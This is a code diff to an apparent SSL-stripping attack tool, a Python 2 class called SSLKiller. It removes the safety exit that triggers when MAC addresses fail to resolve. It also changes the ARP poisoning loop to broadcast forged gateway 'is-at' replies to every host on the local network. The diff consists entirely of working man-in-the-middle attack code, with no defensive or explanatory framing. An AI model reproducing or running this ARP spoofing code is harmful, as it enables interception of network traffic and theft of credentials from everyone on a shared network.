@@ -465,9 +465,9 @@ class SSLKiller(object):
 		print "[+] Gateway IP Address: {}".format(self.gatewayIP)
 		self.gatewayMAC = resolve_mac(self.gatewayIP)
 		print "[+] Gateway MAC Address: {}".format(self.gatewayMAC)
-		if not self.targetMAC or not self.gatewayMAC:
-			print "[!] Failed to resolve MAC Address, check if IP Address is online, exiting ..."
-			exit(0)
+		#if not self.targetMAC or not self.gatewayMAC:
+		#	print "[!] Failed to resolve MAC Address, check if IP Address is online, exiting ..."
+			#exit(0)
 		animation = "|/-\\"
 		for i in range(15):
 		    time.sleep(0.1)
@@ -493,7 +493,7 @@ class SSLKiller(object):
 			socket_L2 = conf.L2socket(iface=self.interface)
 			while True:
 				sleep(3)
-				socket_L2.send(Ether(src=self.hostMAC, dst=self.targetMAC)/ARP(hwsrc=self.hostMAC, psrc=self.gatewayIP, op="is-at"))
+				socket_L2.send(Ether(src=self.hostMAC, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.hostMAC, psrc=self.gatewayIP, op="is-at"))
 				socket_L2.send(Ether(src=self.hostMAC, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.hostMAC, psrc=self.targetIP, op="is-at"))
 		ArpThread()
 		#ArpPoison()
